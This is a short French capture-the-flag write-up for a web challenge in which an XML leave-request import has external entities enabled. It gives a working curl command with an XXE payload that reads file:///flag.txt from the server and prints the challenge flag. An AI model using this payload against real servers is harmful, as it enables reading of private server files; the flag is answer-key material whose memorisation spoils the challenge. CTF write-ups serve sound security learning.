# Export XML

Web · 350 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

L'import de congés lit du XML avec les entités externes activées. On peut donc déclarer dans le document une entité qui
pointe vers un fichier du serveur, et la citer dans un champ que la page nous renvoie. Le réglage `allow_url_fopen=Off`
bloque les URL distantes, mais pas le protocole `file://`.

```bash
curl -s https://export-xml.cyberzerk.fr/ -H 'Content-Type: application/xml' --data '<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<demande><agent>&xxe;</agent><motif>x</motif></demande>'
```

Le contenu du fichier apparaît dans le champ `Agent` de la réponse.

**Flag :** `CyberZerk{XXE_f1l3_pr0t0c0l_l1t_l3_fich13r_d3s_c0ng3s}`
